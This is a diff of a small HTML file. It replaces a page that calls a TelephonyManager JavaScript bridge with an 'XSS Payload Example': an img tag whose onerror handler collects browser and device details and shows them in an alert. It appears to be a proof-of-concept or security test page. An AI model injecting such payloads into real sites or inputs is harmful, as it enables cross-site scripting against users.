@@ -3,25 +3,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TelephonyManager System Details</title>
+    <title>XSS Payload Example</title>
 </head>
 <body>
-    <h1>TelephonyManager System Details</h1>
-    <button onclick="showSystemDetails()">Show System Details</button>
-
-    <script>
-        function showSystemDetails() {
-            if (window.TelephonyManager && typeof window.TelephonyManager.getSystemDetail === 'function') {
-                try {
-                    var details = window.TelephonyManager.getSystemDetail();
-                    alert(details);
-                } catch (e) {
-                    alert('Error retrieving system details: ' + e.message);
-                }
-            } else {
-                alert('TelephonyManager API is not available.');
-            }
-        }
-    </script>
+    <h1>XSS Payload Example</h1>
+    <p>When the image fails to load, an alert will display the device information.</p>
+    
+    <!-- Image tag with the XSS payload in the onerror attribute -->
+    <img src="invalid-url" onerror="
+        var deviceInfo = 'Device Information:\n';
+        deviceInfo += 'User Agent: ' + navigator.userAgent + '\n';
+        deviceInfo += 'Platform: ' + navigator.platform + '\n';
+        deviceInfo += 'Language: ' + navigator.language + '\n';
+        deviceInfo += 'Cookies Enabled: ' + navigator.cookieEnabled + '\n';
+        alert(deviceInfo);
+    " />
 </body>
 </html>
